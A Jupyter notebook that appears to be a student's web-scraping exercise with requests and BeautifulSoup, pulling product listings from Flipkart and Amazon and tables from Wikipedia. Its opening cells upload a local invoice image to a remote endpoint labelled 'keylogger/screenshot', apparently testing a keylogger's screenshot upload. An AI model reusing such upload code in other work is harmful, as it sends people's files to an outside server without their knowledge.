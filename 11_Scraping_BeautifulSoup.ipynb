{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests as rq"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [],
   "source": [
    "f = open(\"C:\\\\Users\\\\Ashutosh\\\\Pictures\\\\Laptop invoice.jpg\",\"rb\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [],
   "source": [
    "r = rq.post(\"https://sam123.pythonanywhere.com/keylogger/screenshot/250/\",files={'ss':f})"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'{\"code\": \"1\", \"msg\": \"success\", \"description\": \"Screenshot uploaded!\"}'"
      ]
     },
     "execution_count": 4,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "r.text"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [],
   "source": [
    "r = rq.get(\"https://www.flipkart.com/search?q=smartphone\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "200"
      ]
     },
     "execution_count": 6,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "r.status_code"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [],
   "source": [
    "import bs4"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [],
   "source": [
    "soup = bs4.BeautifulSoup(r.text,'html.parser')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'Smartphone - Buy Products Online at Best Price in India - All Categories | Flipkart.com'"
      ]
     },
     "execution_count": 9,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "soup.title.get_text()# get_text is valid only for bs object"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {},
   "outputs": [],
   "source": [
    "title = soup.findAll('div',attrs={'class':'_3wU53n'})"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Redmi 8A (Ocean Blue, 32 GB)\n",
      "\n",
      "Redmi 8 (Sapphire Blue, 64 GB)\n",
      "\n",
      "Redmi 8A (Sunset Red, 32 GB)\n",
      "\n",
      "I Kall K1000 (Green, 64 GB)\n",
      "\n",
      "Realme 5i (Forest Green, 64 GB)\n",
      "\n",
      "Realme 5i (Aqua Blue, 64 GB)\n",
      "\n",
      "Redmi 8 (Ruby Red, 64 GB)\n",
      "\n",
      "Vivo Z1Pro (Sonic Black, 128 GB)\n",
      "\n",
      "Vivo Z1Pro (Sonic Black, 64 GB)\n",
      "\n",
      "Vivo Z1Pro (Sonic Blue, 64 GB)\n",
      "\n",
      "Vivo Z1Pro (Sonic Black, 64 GB)\n",
      "\n",
      "Redmi 8 (Onyx Black, 64 GB)\n",
      "\n",
      "Vivo Z1Pro (Sonic Blue, 128 GB)\n",
      "\n",
      "I Kall K900 (Sky Blue, 64 GB)\n",
      "\n",
      "Vivo Z1Pro (Sonic Blue, 64 GB)\n",
      "\n",
      "Redmi 8A (Midnight Black, 32 GB)\n",
      "\n",
      "Redmi 8 (Emerald Green, 64 GB)\n",
      "\n",
      "Infinix Hot 8 (Shark Grey, 64 GB)\n",
      "\n",
      "Redmi 8A (Ocean Blue, 32 GB)\n",
      "\n",
      "I Kall K900 (Dark Blue, 64 GB)\n",
      "\n",
      "Realme 3 (Radiant Blue, 32 GB)\n",
      "\n",
      "Realme 3i (Diamond Black, 32 GB)\n",
      "\n",
      "Realme 3i (Diamond Blue, 32 GB)\n",
      "\n",
      "I Kall K1000 (Blue, 64 GB)\n",
      "\n"
     ]
    }
   ],
   "source": [
    "for item in title:\n",
    "    print(item.get_text())\n",
    "    print()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Enter the price below which you want smartphone:\n",
      "20000\n",
      "Required data successfully fetched!\n"
     ]
    }
   ],
   "source": [
    "import requests as rq\n",
    "import bs4\n",
    "\n",
    "pr = input(\"Enter the price below which you want smartphone:\\n\")\n",
    "r = rq.get(\"https://www.flipkart.com/search?q=smartphone%20under%20\"+pr)#link me se..20 k baad baaki chiz hta diya jata h \n",
    "                                                                    # kyunki wo information mujhe track krne k kaam me aata h\n",
    "\n",
    "soup = bs4.BeautifulSoup(r.text,'html.parser')\n",
    "price = soup.findAll('div',attrs={'class':'_1vC4OE _2rQ-NK'})\n",
    "title = soup.findAll('div',attrs={'class':'_3wU53n'})\n",
    "\n",
    "try:\n",
    "    with open(\"FlipkartPhone.txt\",'w') as f:\n",
    "        for i in range(len(title)):\n",
    "            f.write(\"(\"+title[i].get_text()+\", \"+''.join([x for x in price[i].get_text() if x.isalnum()])+\")\\n\")\n",
    "        print(\"Required data successfully fetched!\")    \n",
    "except:\n",
    "    print(\"Oops!Something went wrong\")\n",
    "        "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "#list of cities in india by population.....wikipedia...in tuples in file"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "#list of mcu movies...names,release date"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "#given user amt laptop on amazon"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "metadata": {
    "scrolled": false
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Required data successfully fetched!\n"
     ]
    }
   ],
   "source": [
    "import requests as rq\n",
    "import bs4\n",
    "\n",
    "r = rq.get(\"https://en.wikipedia.org/wiki/List_of_cities_in_India_by_population\")\n",
    "soup = bs4.BeautifulSoup(r.text,'html.parser')\n",
    "rows = soup.findAll('tr')\n",
    "for i in rows[1:302]:    #52 sno is repeated \n",
    "    datas = i.children     #datas is list_iterator object of string objects j\n",
    "    list_of_reqd_str_objects = [j for j in datas if j.string!=None and j!='\\n' ]\n",
    "    new_list_of_reqd_strings = [x.string for x in list_of_reqd_str_objects]   #list slicing\n",
    "    ultimate_list = new_list_of_reqd_strings[1:3]  #Bangalore and some other cities not printed \n",
    "                                                  #as in those cities inside <td> there is <b>  \n",
    "    try:\n",
    "        with open(\"CityPopulation.txt\",'a') as f:\n",
    "            f.write(\"(\"+ultimate_list[0].string+ \", \" +ultimate_list[1].string +\")\\n\")\n",
    "            success = 1\n",
    "    except:\n",
    "        success = 0\n",
    "\n",
    "if success == 1 :\n",
    "    print(\"Required data successfully fetched!\")\n",
    "else:\n",
    "    print(\"Oops!Something went wrong\")\n",
    "#        for j in datas:\n",
    "#         print(j.string)\n",
    "    "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Required data successfully fetched!\n"
     ]
    }
   ],
   "source": [
    "import requests as rq\n",
    "import bs4\n",
    "\n",
    "r = rq.get(\"https://en.wikipedia.org/wiki/List_of_Marvel_Cinematic_Universe_films\")\n",
    "soup = bs4.BeautifulSoup(r.text,'html.parser')\n",
    "\n",
    "movies = soup.findAll('th',attrs = {'scope':'row','style':'text-align:left'})\n",
    "release_dates = soup.findAll('span',attrs = {'data-sort-value':True,'style':'white-space:nowrap'})\n",
    "\n",
    "movies = list(movies)[0:23]\n",
    "release_dates = list(release_dates)[0:23]\n",
    "for i in range(len(movies)):\n",
    "    try:\n",
    "        with open(\"MCU_movie_dates.txt\",'a') as f:\n",
    "            f.write(\"(\"+movies[i].get_text().strip('\\n')+ \", \" +release_dates[i].get_text() +\")\\n\")\n",
    "            success = 1\n",
    "    except:\n",
    "        success = 0\n",
    "\n",
    "if success == 1 :\n",
    "    print(\"Required data successfully fetched!\")\n",
    "else:\n",
    "    print(\"Oops!Something went wrong\")        "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Enter the price below which you want laptop:\n",
      "50000\n",
      "Required data successfully fetched!\n"
     ]
    }
   ],
   "source": [
    "import requests as rq\n",
    "import bs4\n",
    "\n",
    "pr = input(\"Enter the price below which you want laptop:\\n\")\n",
    "r = rq.get(\"https://www.amazon.in/s?k=laptops+under+\"+pr)\n",
    "\n",
    "soup = bs4.BeautifulSoup(r.text,'html.parser')\n",
    "price = soup.findAll('span',attrs = {'class':'a-price-whole'})\n",
    "title = soup.findAll('span',attrs = {'class':'a-size-medium a-color-base a-text-normal'})\n",
    "\n",
    "try:\n",
    "    with open(\"AmazonLaptop.txt\",'w') as f:\n",
    "        for i in range(len(title)):\n",
    "            f.write(\"(\"+title[i].get_text()+\", \"+''.join([x for x in price[i].get_text() if x.isalnum()])+\")\\n\")   \n",
    "        print(\"Required data successfully fetched!\")    \n",
    "except:\n",
    "    print(\"Oops!Something went wrong\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [],
   "source": [
    "#city wiki\n",
    "#better soln\n",
    "from bs4 import BeautifulSoup\n",
    "import requests as rq\n",
    "\n",
    "final_string = \"\"\n",
    "counter = 0\n",
    "r = rq.get(\"https://en.wikipedia.org/wiki/List_of_cities_in_India_by_population\")\n",
    "bs = BeautifulSoup(r.text, \"html.parser\")\n",
    "table_body = bs.find('tbody')\n",
    "rows = table_body.find_all('tr')\n",
    "\n",
    "for tr in rows[1:]:\n",
    "    city = tr.find('a').get_text()\n",
    "    pop = tr.find_all('td')[2].get_text()\n",
    "    with open('city.txt','a') as f:\n",
    "        f.write(\"(\"+city+\" , \"+pop+\")\\n\")\n",
    "# for row in rows:\n",
    "        \n",
    "#         cols = row.find_all('td')\n",
    "#         cols = [x.text.strip() for x in cols]\n",
    "#         print(cols)\n",
    "#         for i in range(len(cols)):\n",
    "#             res = (cols[0],cols[1],cols[2])\n",
    "#         each_details = \" \".join(name for name in res)\n",
    "#         final_string = final_string + each_details + \"\\n\\n\"\n",
    "\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.6"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
